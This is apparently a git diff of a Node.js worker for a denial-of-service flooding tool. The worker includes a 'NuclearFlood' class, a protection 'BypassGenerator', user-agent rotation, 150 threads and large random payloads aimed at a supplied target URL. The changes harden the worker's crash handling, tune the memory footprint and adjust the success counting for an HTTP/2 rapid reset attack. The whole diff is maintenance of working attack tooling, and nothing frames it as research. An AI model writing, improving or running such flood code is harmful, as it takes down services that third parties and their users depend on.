@@ -8,31 +8,17 @@ const crypto = require('crypto');
 process.on('uncaughtException', (err, origin) => {
     const errorMessage = `FATAL: Uncaught Exception\nOrigin: ${origin}\nError: ${err.stack || err}`;
     console.error(errorMessage);
-    if (process.send) {
-        // Send the error message and exit once it's sent.
-        process.send({ type: 'error', data: errorMessage }, () => {
-            process.exit(1);
-        });
-        // Add a timeout in case sending hangs, to ensure the process eventually exits.
-        setTimeout(() => process.exit(1), 1000);
-    } else {
-        process.exit(1); // Exit if not a child process
-    }
+    // The console.error will be piped to the parent process's stderr.
+    // The process must exit for the parent to know it crashed.
+    process.exit(1);
 });
 
 process.on('unhandledRejection', (reason, promise) => {
     const errorMessage = `FATAL: Unhandled Rejection\nReason: ${reason.stack || reason}`;
     console.error(errorMessage);
-    if (process.send) {
-        // Send the error message and exit once it's sent.
-        process.send({ type: 'error', data: errorMessage }, () => {
-            process.exit(1);
-        });
-        // Add a timeout in case sending hangs, to ensure the process eventually exits.
-        setTimeout(() => process.exit(1), 1000);
-    } else {
-        process.exit(1); // Exit if not a child process
-    }
+    // The console.error will be piped to the parent process's stderr.
+    // The process must exit for the parent to know it crashed.
+    process.exit(1);
 });
 
 const userAgents = [
@@ -294,17 +280,15 @@ class NuclearFlood {
                 // this would crash the entire worker process.
                 req.on('error', () => {});
 
-                try {
-                    req.destroy();
-                    this.stats.success++;
-                } catch (e) {
-                    this.stats.failed++;
-                }
+                // Simply destroy the request. The outcome will be handled by the stream's 'error' event.
+                req.destroy();
             });
             stream.on('error', (error) => {
-                if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT' || error.code === 'ECONNRESET') {
+                // For a rapid reset attack, errors like timeout, reset, or abort are expected and indicate success.
+                if (error.name === 'TimeoutError' || error.code === 'ETIMEDOUT' || error.code === 'ECONNRESET' || (error.message && error.message.includes('aborted'))) {
                     this.stats.success++;
                 } else {
+                    // Only count as failed if it's an unexpected error.
                     this.stats.failed++;
                 }
             });
@@ -339,7 +323,8 @@ process.on('message', async ({ targetUrl, duration }) => {
     const threads = 150;
     const l7Delay = 900;
 
-    const PAYLOAD_SIZE = 5 * 1024 * 1024;
+    // Reduced from 5MB to 1MB to prevent Out-Of-Memory crashes on startup in resource-constrained environments.
+    const PAYLOAD_SIZE = 1 * 1024 * 1024;
     const largePayload = crypto.randomBytes(PAYLOAD_SIZE);
 
     const bypasser = new BypassGenerator();
